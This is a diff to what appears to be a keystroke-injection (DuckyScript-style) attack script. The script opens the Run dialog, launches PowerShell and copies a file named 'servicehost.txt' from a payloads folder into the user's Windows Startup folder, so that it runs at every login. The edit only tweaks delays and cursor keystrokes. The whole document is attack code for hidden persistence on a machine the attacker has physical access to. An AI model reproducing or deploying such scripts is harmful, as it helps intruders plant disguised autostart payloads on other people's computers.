@@ -1,3 +1,4 @@
+DELAY 200
 GUI r
 DELAY 200
 STRING powershell
@@ -6,7 +7,11 @@ DELAY 500
 STRING copy
 SPACE
 CONTROL v
-BACKSPACE
+DELAY 500
+UPARROW
+DELAY 200
+DELETE
+DELAY 200
 STRING payloads\servicehost.txt 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
 ENTER
 DELAY 200
